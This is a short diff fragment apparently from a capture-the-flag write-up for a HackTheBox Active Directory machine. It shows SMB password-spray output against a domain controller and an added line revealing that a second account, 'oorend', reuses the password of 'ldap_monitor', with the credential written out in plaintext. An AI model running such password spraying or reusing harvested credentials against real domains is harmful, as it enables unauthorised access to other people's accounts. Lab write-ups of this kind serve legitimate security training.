@@ -244,4 +244,10 @@ SMB         10.129.14.17    445    DC01             [-] rebound.htb\batch_runner
 SMB         10.129.14.17    445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
 SMB         10.129.14.17    445    DC01             [-] rebound.htb\delegator$:1GR8t@$$4u STATUS_LOGON_FAILURE
 ```
-There is another user using the same password a
+There is another user using the same password as `ldap_monitor`
+
+```python
+oorend:1GR8t@$$4u
+```
+
+Thise u
